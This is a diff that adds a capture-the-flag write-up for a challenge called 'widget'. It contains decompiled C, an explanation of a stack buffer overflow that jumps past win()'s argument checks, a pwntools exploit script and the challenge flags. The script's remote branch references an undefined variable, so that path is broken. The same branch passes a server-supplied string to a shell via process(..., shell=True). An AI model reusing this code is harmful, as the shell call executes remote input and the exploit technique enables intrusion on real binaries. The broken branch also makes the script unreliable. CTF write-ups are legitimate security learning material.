@@ -1456,3 +1456,118 @@ if __name__ == "__main__":
 ```
 
 🏁 _actf{very_133k_of_y0u_777522a2c32b7dd6}_{: .spoiler}
+
+## widget
+
+> _I seem to have lost my gadgets._<br>
+> _nc challs.actf.co xxxxx_<br>
+> _Attachments: widget, Dockerfile_
+
+After decompiling the binary with Ghidra we have the following functions:
+```c:source
+void win(char *param_1,char *param_2)
+
+{
+  int iVar1;
+  char local_98 [136];
+  FILE *local_10;
+
+  iVar1 = strncmp(param_1,"14571414c5d9fe9ed0698ef21065d8a6",0x20);
+  if (iVar1 != 0) {
+    exit(1);
+  }
+  iVar1 = strncmp(param_2,"willy_wonka_widget_factory",0x1a);
+  if (iVar1 != 0) {
+    exit(1);
+  }
+  local_10 = fopen("flag.txt","r");
+  if (local_10 == (FILE *)0x0) {
+    puts("Error: missing flag.txt.");
+    exit(1);
+  }
+  fgets(local_98,0x80,local_10);
+  puts(local_98);
+  return;
+}
+
+void main(void)
+{
+  int length;
+  char buffer [24];
+  __gid_t local_10;
+  uint local_c;
+
+  setbuf(stdout,(char *)0x0);
+  setbuf(stdin,(char *)0x0);
+  local_10 = getegid();
+  setresgid(local_10,local_10,local_10);
+  if (called != 0) {
+    exit(1);
+  }
+  called = 1;
+  printf("Amount: ");
+  length = 0;
+  __isoc99_scanf(&DAT_00402071,&length);
+  getchar();
+  if (length < 0) {
+    exit(1);
+  }
+  printf("Contents: ");
+  read(0,buffer,(long)length);
+  local_c = 0;
+  while( true ) {
+    if (length <= (int)local_c) {
+      printf("Your input: ");
+      printf(buffer);
+      return;
+    }
+    if (buffer[(int)local_c] == 'n') break;
+    local_c = local_c + 1;
+  }
+  printf("bad %d\n",(ulong)local_c);
+  exit(1);
+}
+```
+We note that in the `main` function there is buffer overflow because we can control the number of bytes we can input with `read`. There is also a format string vulnerability but we will not use it here.
+The idea is to exploit the buffer overflow to redirect the execution to the function `win`.
+To properly call `win` we need to pass it two arguments, but we do not have enough gadgets in our binary. This is not a problem because we can directly jump in the middle of `win`, just after
+the parameter checks (address `win+117`) provided that we set up the `rbp` register to a valid address, for instance, an address in the data section.
+
+```python:solve.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./widget")
+context.log_level = "debug"
+context.binary = exe
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+    elif args.GDB:
+        r = gdb.debug([exe.path], gdbscript='''
+                      b *main+341
+                      c
+                      ''')
+    else:
+        r = remote("challs.actf.co", 31320)
+        p.recvuntil(b'proof of work: ')
+        data=p.recvline().strip()
+        p1 = process(data, shell=True)
+        solution=p1.recvline()
+        p.sendlineafter(b'solution: ', solution)
+    return r
+
+offset = 32   # we fill until rbp, we set rbp to the address 0x404100
+payload = b'A'*offset + p64(0x404100) + p64(exe.symbols.win + 117)
+
+p = conn()
+
+p.sendlineafter(b'Amount: ', b'100')
+p.sendafter(b'Contents: ', payload)
+p.interactive()
+```
+
+🏁 _actf{y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981}_{: .spoiler}
+
